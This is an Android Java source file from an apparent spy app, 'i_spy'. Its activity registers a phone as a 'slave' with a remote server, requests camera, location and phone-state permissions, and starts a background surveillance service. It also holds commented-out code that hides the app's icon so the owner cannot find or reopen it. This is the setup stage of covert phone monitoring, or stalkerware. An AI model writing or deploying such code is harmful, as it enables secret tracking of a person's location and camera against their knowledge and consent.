package com.um.asn.i_spy;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.ExecutionException;

public class RegisterSlaveActivity extends AppCompatActivity {

    public final static int REQUEST_ALL_PERM = 0;
    public final static String SERVER_DOMAIN = "https://ispy.calyxe.fr/index.php/phone/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_register_slave);

        // Demande les permissions nécessaires
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA, Manifest.permission.LOCATION_HARDWARE, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, }, REQUEST_ALL_PERM);

        Button registerSlaveButton = (Button) findViewById(R.id.register_slave_button);

        registerSlaveButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                final EditText register_slave_login = (EditText) findViewById(R.id.register_slave_login);
                final EditText register_slave_password = (EditText) findViewById(R.id.register_slave_password);

                if(!register_slave_login.getText().toString().equals("") && !register_slave_password.getText().toString().equals("")) {

                    ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

                    NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
                    if (networkInfo != null && networkInfo.isConnected()) {

                        JSONObject jo = new JSONObject();
                        try {
                            jo.put("password", register_slave_password.getText().toString());
                            jo.put("number", register_slave_login.getText().toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    /* Creation d'un objet HttpPostTask et execution de la méthode
                     * doInBackground */
                        JSONObject result = null;
                        try {
                            result = new JSONObject(
                                    (String) new HttpPostTask().execute(new Object[]{SERVER_DOMAIN, jo.toString()}).get()
                            );

                            if ((boolean)result.get("success")) {

                                // Pour enregistrer l'eventListner sur les changements de connexion (car deprecated dans Nougat)
                                registerReceiver(new ConnectionReceiver(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));

                                JSONObject data = (JSONObject) result.get("data");

                                Toast.makeText(RegisterSlaveActivity.this, R.string.success, Toast.LENGTH_LONG).show();

                                try {
                                    FileOutputStream file = openFileOutput("slave.txt", MODE_PRIVATE);
                                    file.write(data.toString().getBytes());
                                    file.close();
                                } catch (FileNotFoundException e) {
                                    e.printStackTrace();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }

                                // Pour cacher l'icon de l'application dans la liste des app
                                // Ferme l'app et empêche de la réouvrir...
                                // Il faut la désinstaller et réinstaller
                                /*PackageManager p = getPackageManager();
                                ComponentName componentName = new ComponentName(
                                        RegisterSlaveActivity.this,
                                        com.um.asn.i_spy.ChooseModeActivity.class
                                );
                                p.setComponentEnabledSetting(
                                        componentName,
                                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                        PackageManager.DONT_KILL_APP
                                );*/

                                // Démarre le service
                                Intent slaveService = new Intent(RegisterSlaveActivity.this, SlaveService.class);
                                startService(slaveService);

                                // Ferme l'application
                                Intent intent = new Intent(getApplicationContext(), ChooseModeActivity.class);
                                intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                intent.putExtra("EXIT", true);
                                startActivity(intent);

                            } else {
                                Toast.makeText(RegisterSlaveActivity.this, getResources().getString(R.string.error) + " (" + result.get("message") + ")", Toast.LENGTH_LONG).show();
                            }

                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (ExecutionException e) {
                            e.printStackTrace();
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }


                    } else {
                        Toast.makeText(RegisterSlaveActivity.this, R.string.message_internet_connection_error, Toast.LENGTH_LONG).show();
                    }
                }
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case REQUEST_ALL_PERM: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(RegisterSlaveActivity.this, "PERM OK !", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(RegisterSlaveActivity.this, "PERM NOT OK !", Toast.LENGTH_LONG).show();
                }
                return;
            }
        }
    }
}
